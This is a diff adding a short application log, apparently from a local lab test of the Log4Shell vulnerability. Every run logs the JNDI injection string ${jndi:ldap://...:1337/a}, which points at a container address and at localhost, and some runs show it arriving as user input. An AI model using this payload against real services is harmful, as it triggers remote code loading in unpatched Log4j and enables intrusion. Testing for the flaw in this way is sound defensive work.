@@ -1,0 +1,15 @@
+2024-07-03 23:26:42.551 [main] INFO  App - Starting application
+2024-07-03 23:26:42.557 [main] INFO  App - No user input provided
+2024-07-03 23:26:42.557 [main] INFO  App - ${jndi:ldap://172.17.0.2:1337/a
+2024-07-03 23:27:26.585 [main] INFO  App - Starting application
+2024-07-03 23:27:26.590 [main] INFO  App - No user input provided
+2024-07-03 23:27:26.590 [main] INFO  App - ${jndi:ldap://172.17.0.2:1337/a
+2024-07-03 23:27:47.635 [main] INFO  App - Starting application
+2024-07-03 23:27:47.640 [main] INFO  App - No user input provided
+2024-07-03 23:27:47.640 [main] INFO  App - ${jndi:ldap://localhost:1337/a
+2024-07-03 23:28:28.720 [main] INFO  App - Starting application
+2024-07-03 23:28:28.726 [main] INFO  App - User input: ${jndi:ldap://localhost:1337/a
+2024-07-03 23:28:28.726 [main] INFO  App - ${jndi:ldap://localhost:1337/a
+2024-07-03 23:28:37.923 [main] INFO  App - Starting application
+2024-07-03 23:28:37.929 [main] INFO  App - User input: ${jndi:ldap://localhost:1337/a
+2024-07-03 23:28:37.929 [main] INFO  App - ${jndi:ldap://localhost:1337/a
